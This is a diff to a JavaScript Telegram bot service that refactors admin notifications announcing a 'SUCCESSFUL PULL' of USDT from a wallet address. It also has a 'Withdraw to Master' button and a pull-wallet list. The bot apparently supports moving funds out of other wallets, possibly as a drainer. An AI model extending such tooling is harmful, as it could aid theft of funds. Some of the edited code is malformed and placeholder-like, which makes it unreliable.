@@ -461,7 +461,8 @@ Actions:
 }
 
 
-    async sendSuccessMessage(walletAddress, amount, txHash) {
+    // Inside sendSuccessMessage function, remove the nested try-catch
+async sendSuccessMessage(walletAddress, amount, txHash) {
     if (!this.bot || !this.adminChatId) return;
     
     const escapedAddress = this.escapeMarkdown(walletAddress);  // Escape wallet address
@@ -517,36 +518,8 @@ Next steps:
         });
     }
 }
-    
-    try {
-    return await this.bot.sendMessage(this.adminChatId, message, options);
-} catch (error) {
-    console.error('Error processing Telegram update:', error.message);
-}
 
-            // Fallback without markdown
-            const fallbackMessage = `
-✅ SUCCESSFUL PULL
-Address: ${walletAddress}
-Amount: ${amount} USDT
-Transaction: ${txHash}
-
-Next steps:
-            `;
-            return await this.bot.sendMessage(this.adminChatId, fallbackMessage, {
-                reply_markup: {
-                    inline_keyboard: [
-                        [
-                            { text: '📥 Withdraw to Master', callback_data: 'withdraw' }
-                        ],
-                        [
-                            { text: '🏠 Main Menu', callback_data: 'menu' }
-                        ]
-                    ]
-                }
-            });
-        }
-    }
+// Other blocks like sendPullWalletList, handleWithdrawCommand, handleBalancesCommand, etc., should follow similar structure
 
     async sendPullWalletList(chatId) {
         if (chatId.toString() !== this.adminChatId) {
@@ -954,6 +927,7 @@ The withdraw operation is ready to be implemented with real blockchain integrati
 }
 
 module.exports = new TelegramService();
+
 
 
 
